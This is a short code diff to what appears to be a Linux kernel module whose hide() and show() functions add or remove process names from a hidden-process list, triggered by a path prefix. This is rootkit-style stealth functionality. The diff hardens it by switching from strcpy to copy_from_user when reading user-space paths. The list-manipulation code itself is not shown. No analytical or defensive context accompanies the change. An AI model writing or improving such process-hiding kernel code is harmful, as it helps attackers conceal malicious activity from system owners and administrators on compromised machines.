@@ -16,7 +16,7 @@ static int addProcessToHide(char* processName);
 static int deleteProcessToHide(char* processName);
 
 /* hide a directory entry */
-int hide(const char *path) {
+int hide(const char __user *path) {
   int result;
   char* tempPath;
   
@@ -25,11 +25,11 @@ int hide(const char *path) {
   
   if (IS_ERR(path))
     return -EINVAL;
-  tempPath = kcalloc(strlen(path),1,GFP_KERNEL);
+  tempPath = kcalloc(strlen_user(path) - strlen(hide__prefix) + 1,1,GFP_KERNEL);
   if(IS_ERR_OR_NULL(tempPath)){
     return -ENOMEM;
   }
-  strcpy(tempPath,path+strlen(hide__prefix));
+  copy_from_user(tempPath,path+strlen(hide__prefix), strlen_user(path) - strlen(hide__prefix) + 1);
   //      printk("%s",tempPath);
   result = addProcessToHide(tempPath);
   if(result == -ENOMEM)
@@ -128,7 +128,7 @@ int hide_init(struct sctm *sctm) {
 }
 
 /* show a directory entry */
-int show(const char *path) {
+int show(const char __user *path) {
   char *tempPath;
   
   if (path == NULL)
@@ -136,10 +136,10 @@ int show(const char *path) {
   
   if (IS_ERR(path))
     return -EINVAL;
-  tempPath = kcalloc(strlen(path),1,GFP_KERNEL);
+  tempPath = kcalloc(strlen_user(path) - strlen(hide__prefix) + 1,1,GFP_KERNEL);
   if(IS_ERR_OR_NULL(tempPath))
     return -ENOMEM;
-  strcpy(tempPath,path+strlen(hide__prefix));
+  copy_from_user(tempPath,path+strlen(hide__prefix), strlen_user(path) - strlen(hide__prefix) + 1);
   //      printk("%s",tempPath);
   deleteProcessToHide(tempPath);
   kfree(tempPath);
